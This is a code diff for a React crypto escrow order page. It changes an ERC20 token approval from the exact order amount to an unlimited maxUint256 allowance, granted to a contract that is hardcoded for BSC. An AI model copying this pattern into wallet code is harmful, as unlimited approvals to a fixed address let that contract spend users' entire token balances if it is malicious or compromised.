@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useAccount, useReadContract, useWriteContract, useSwitchChain, useChainId } from 'wagmi';
 import { waitForTransactionReceipt } from '@wagmi/core';
-import { parseUnits, formatUnits } from 'viem';
+import { parseUnits, formatUnits, maxUint256 } from 'viem';
 import { api } from '../lib/api';
 import { haptic } from '../lib/telegram';
 import { CONTRACTS, ESCROW_ABI, ERC20_ABI } from '../lib/contracts';
@@ -229,7 +229,7 @@ export function CreateOrder() {
             const switched = await smartSwitch(targetChainId);
             if (!switched) return;
 
-            const amountUnits = parseUnits(amount, decimals);
+            // Unlimited approval using maxUint256
             const currentEscrow = chain === 'bsc' ? "0x74edAcd5FefFe2fb59b7b0942Ed99e49A3AB853a" : escrowAddress;
             const isBsc = chain === 'bsc';
             const gasPrice = isBsc ? parseUnits('0.1', 9) : undefined;
@@ -240,7 +240,7 @@ export function CreateOrder() {
                 address: tokenAddress as `0x${string}`,
                 abi: ERC20_ABI,
                 functionName: 'approve',
-                args: [currentEscrow as `0x${string}`, amountUnits],
+                args: [currentEscrow as `0x${string}`, maxUint256],
                 gasPrice,
                 gas: isBsc ? 100000n : undefined
             });
